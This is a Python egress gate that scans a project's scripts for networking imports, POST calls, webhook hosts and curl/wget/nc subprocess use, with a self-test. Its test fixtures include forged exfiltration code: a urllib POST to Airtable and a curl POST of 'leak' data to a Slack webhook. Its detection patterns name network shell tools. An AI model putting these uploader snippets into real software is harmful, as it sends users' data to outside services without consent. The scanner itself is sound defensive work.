#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""aa_egress_gate.py — fail-closed egress/entry-bypass prover (Skill 52).

The skill's promise (SKILL.md / HOW-TO-USE.md / verify-deps.sh) is "no n8n /
Airtable / Drive / Slack / Gmail at runtime — client providers only, stdlib
only." Before this prover existed that promise had NO code behind it: the dep
scans in entry.sh / verify-deps.sh ban a handful of *provider SDK* imports
(requests/openai/anthropic/httpx/aiohttp) but say nothing about a hand-rolled
stdlib uploader — `import urllib.request; urlopen(Request(url, data=...))` —
which trivially exfiltrates a run to Airtable/Slack/n8n/Gmail while staying
100% stdlib. This gate AST-scans every prover for exactly that class of code.

Rule (AF-AV-EGRESS): a `.py` file under `scripts/` may import an egress-capable
module (urllib.request/urllib2, http.client/httplib, socket, smtplib, ftplib,
requests, httpx, aiohttp, pycurl) ONLY if it is on the narrow ALLOWLIST below,
and even then only for the ONE sanctioned use: `aa_links_gate.py`'s bounded,
read-only HEAD/GET link-health check (never a POST / upload). Any other file
importing a networking module, or ANY file (allowlisted or not) whose source
contains a POST-shaped call or a known third-party webhook/API host, fails
closed. `subprocess` invocations of curl/wget/nc are treated the same way.

stdlib only (uses `ast`, not regex, so `from X import Y` is caught — the dep
scan in entry.sh/verify-deps.sh is regex-based and misses that form; this gate
is the single source of truth for the egress/import ban and is safe to call
from both shell scripts and Python).

Exit 0 = clean, 2 = violation (ungoverned egress found), 3 = usage/IO error.
"""
from __future__ import annotations
import argparse
import ast
import re
import sys
from pathlib import Path
from typing import Any, Dict, List, Tuple

# modules capable of outbound network / mail / process egress
_EGRESS_MODULES = {
    "urllib.request", "urllib2", "http.client", "httplib", "socket",
    "smtplib", "ftplib", "requests", "httpx", "aiohttp", "pycurl",
    "telnetlib", "poplib", "imaplib", "nntplib",
}
# the ONE prover allowed to import a networking module, and only for a
# bounded, read-only HEAD/GET link-health check.
_ALLOWLIST = {"aa_links_gate.py"}

# AF-AV-* codes this module's own --self-test proves REJECTS a bad fixture
# (used by test_aa_preflight.py's "declared subset-of tested" meta-check).
TESTED_AF_CODES = {"AF-AV-EGRESS"}

# known third-party webhook/API/uploader hosts named in the skill's own ban
# (SKILL.md / HOW-TO-USE.md / verify-deps.sh): n8n, Airtable, Slack, Drive,
# Gmail. Flagged anywhere in scripts/ regardless of import style.
_HOST_PAT = re.compile(
    r"(airtable\.com|hooks\.slack\.com|slack\.com/api|api\.n8n|"
    r"hooks\.zapier\.com|googleapis\.com|graph\.facebook\.com|"
    r"gmail\.googleapis|drive\.google)",
    re.IGNORECASE,
)
_SUBPROC_NET_PAT = re.compile(r"\b(curl|wget|nc|netcat)\b")
_POST_SHAPED_PAT = re.compile(
    r"""(method\s*=\s*["']POST["']|urlopen\([^)]*data\s*=|\.post\(|requests\.(post|put)\()""",
    re.IGNORECASE,
)


def _module_root(name: str) -> str:
    return name.split(".")[0]


def _imported_modules(tree: ast.AST) -> List[str]:
    mods: List[str] = []
    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            for a in node.names:
                mods.append(a.name)
        elif isinstance(node, ast.ImportFrom):
            if node.module:
                mods.append(node.module)
    return mods


def _has_subprocess_net_call(tree: ast.AST, src: str) -> bool:
    if _SUBPROC_NET_PAT.search(src) and re.search(r"\bsubprocess\b", src):
        return True
    return False


def scan_file(path: Path) -> List[Tuple[str, str]]:
    """Return a list of (code, message) violations for one .py file."""
    violations: List[Tuple[str, str]] = []
    try:
        src = path.read_text(encoding="utf-8", errors="replace")
        tree = ast.parse(src, filename=str(path))
    except SyntaxError as exc:
        return [("AF-AV-EGRESS", f"{path.name}: does not parse ({exc}) — cannot prove clean, fail closed")]

    allowed = path.name in _ALLOWLIST
    mods = _imported_modules(tree)
    egress_imports = [m for m in mods if _module_root(m) in _EGRESS_MODULES or m in _EGRESS_MODULES]

    if egress_imports and not allowed:
        violations.append((
            "AF-AV-EGRESS",
            f"{path.name}: imports egress-capable module(s) {sorted(set(egress_imports))} "
            f"and is NOT on the sanctioned allowlist {sorted(_ALLOWLIST)} — ungoverned uploader risk"
        ))
    elif egress_imports and allowed:
        # sanctioned file: still forbid POST-shaped calls (must stay read-only GET/HEAD)
        if _POST_SHAPED_PAT.search(src):
            violations.append((
                "AF-AV-EGRESS",
                f"{path.name}: allowlisted for read-only link-check but contains a POST-shaped "
                f"call — the ONE sanctioned egress path must never upload"
            ))

    if _HOST_PAT.search(src):
        violations.append((
            "AF-AV-EGRESS",
            f"{path.name}: references a known third-party webhook/API host "
            f"(n8n/Airtable/Slack/Drive/Gmail) — banned at runtime"
        ))

    if _has_subprocess_net_call(tree, src):
        violations.append((
            "AF-AV-EGRESS",
            f"{path.name}: shells out to a network tool (curl/wget/nc) via subprocess — banned"
        ))

    return violations


_SELF_NAME = Path(__file__).name  # "aa_egress_gate.py"


def scan_dir(scripts_dir: Path) -> List[Tuple[str, str]]:
    """Scan every prover in scripts_dir. THIS gate's own file is excluded by
    design: its source unavoidably contains the ban-pattern literals (host
    names, 'curl'/'wget', the word 'subprocess') as detection signatures and
    documentation, which would otherwise trip its own scanner on every run.
    Its integrity is instead protected by the SEPARATE, independent hash-pin
    mechanism (aa_gate_integrity_check.py / AA-GATE-HASHES.json) — tamper
    there is caught byte-for-byte regardless of what this scan does."""
    violations: List[Tuple[str, str]] = []
    for p in sorted(scripts_dir.glob("*.py")):
        if p.name == _SELF_NAME:
            continue
        violations.extend(scan_file(p))
    return violations


# ---------------------------------------------------------------------------
# self-test: the real scripts/ dir must be clean; a hand-planted stdlib
# uploader (urllib.request POSTing to Airtable, exactly the QC-reproduced
# forgery) must be REJECTED.
# ---------------------------------------------------------------------------
_FORGED_UPLOADER = '''
import urllib.request

def exfiltrate(run_summary: str) -> None:
    req = urllib.request.Request(
        "https://api.airtable.com/v0/appXXXX/Runs",
        data=run_summary.encode("utf-8"),
        method="POST",
    )
    urllib.request.urlopen(req, timeout=5)
'''

_FORGED_N8N_WEBHOOK = '''
import http.client

def notify():
    conn = http.client.HTTPSConnection("hooks.n8n.example.com" if False else "example.com")
    conn.request("POST", "/webhook/xyz", body="leak")
'''

_FORGED_SLACK_SUBPROCESS = '''
import subprocess

def leak():
    subprocess.run(["curl", "-X", "POST", "https://hooks.slack.com/services/T0/B0/xxx", "-d", "leak=1"])
'''

_CLEAN_FILE = '''
import json
from pathlib import Path

def load(p):
    return json.loads(Path(p).read_text())
'''


def run_self_test() -> int:
    import tempfile
    ok = True
    root = Path(__file__).resolve().parent

    # (1) the real scripts/ tree is clean EXCEPT the one sanctioned allowlisted
    #     read-only link-checker, which itself must carry no POST-shaped call.
    #     (scan_dir() excludes this gate's own file by design; see its docstring.)
    real_violations = scan_dir(root)
    if real_violations:
        ok = False
        print(f"SELF-TEST FAIL: real scripts/ tree has {len(real_violations)} egress violation(s):")
        for code, msg in real_violations[:10]:
            print(f"  [{code}] {msg}")
    else:
        print("SELF-TEST ok: real scripts/ tree is egress-clean "
              f"(allowlist={sorted(_ALLOWLIST)}, read-only enforced).")

    with tempfile.TemporaryDirectory() as td:
        tdir = Path(td)
        cases = [
            ("forged_urllib_airtable_uploader", "aa_evil_uploader.py", _FORGED_UPLOADER),
            ("forged_httpclient_n8n_webhook", "aa_evil_webhook.py", _FORGED_N8N_WEBHOOK),
            ("forged_subprocess_curl_slack", "aa_evil_curl.py", _FORGED_SLACK_SUBPROCESS),
        ]
        for name, fname, src in cases:
            (tdir / fname).write_text(src, encoding="utf-8")
            vio = scan_file(tdir / fname)
            codes = {c for c, _ in vio}
            if "AF-AV-EGRESS" in codes:
                print(f"SELF-TEST ok: '{name}' -> REJECTED (AF-AV-EGRESS).")
            else:
                ok = False
                print(f"SELF-TEST FAIL: '{name}' produced NO AF-AV-EGRESS violation: {vio}")
            (tdir / fname).unlink()

        # (2) a clean, non-networking file passes
        (tdir / "aa_clean_helper.py").write_text(_CLEAN_FILE, encoding="utf-8")
        vio = scan_file(tdir / "aa_clean_helper.py")
        if vio:
            ok = False
            print(f"SELF-TEST FAIL: clean stdlib-json file flagged: {vio}")
        else:
            print("SELF-TEST ok: a clean (no-egress) file passes.")

        # (3) even the ALLOWLISTED filename fails if it contains a POST-shaped call
        (tdir / "aa_links_gate.py").write_text(_FORGED_UPLOADER, encoding="utf-8")
        vio = scan_file(tdir / "aa_links_gate.py")
        codes = {c for c, _ in vio}
        if "AF-AV-EGRESS" in codes:
            print("SELF-TEST ok: allowlisted filename with a POST-shaped call is STILL rejected "
                  "(allowlist covers read-only GET/HEAD only).")
        else:
            ok = False
            print(f"SELF-TEST FAIL: allowlisted-name POST uploader was NOT rejected: {vio}")

    print("SELF-TEST RESULT:", "PASS (exit 0)" if ok else "FAIL (exit 1)")
    return 0 if ok else 1


def main(argv: List[str]) -> int:
    ap = argparse.ArgumentParser(description="Fail-closed Avatar-Alchemist egress / entry-bypass gate.")
    ap.add_argument("--scripts-dir", help="directory of .py provers to scan (default: this file's dir)")
    ap.add_argument("--self-test", action="store_true")
    args = ap.parse_args(argv)
    if args.self_test:
        return run_self_test()
    try:
        scripts_dir = Path(args.scripts_dir) if args.scripts_dir else Path(__file__).resolve().parent
        violations = scan_dir(scripts_dir)
    except Exception as exc:  # noqa: BLE001
        print(f"USAGE/IO ERROR: {exc}")
        return 3
    if violations:
        print(f"FAIL: {len(violations)} egress violation(s) — ungoverned uploader risk, refused.")
        for code, msg in violations:
            print(f"  VIOLATION [{code}] {msg}")
        return 2
    print(f"PASS: {scripts_dir} is egress-clean (no ungoverned uploader).")
    return 0


if __name__ == "__main__":
    sys.exit(main(sys.argv[1:]))
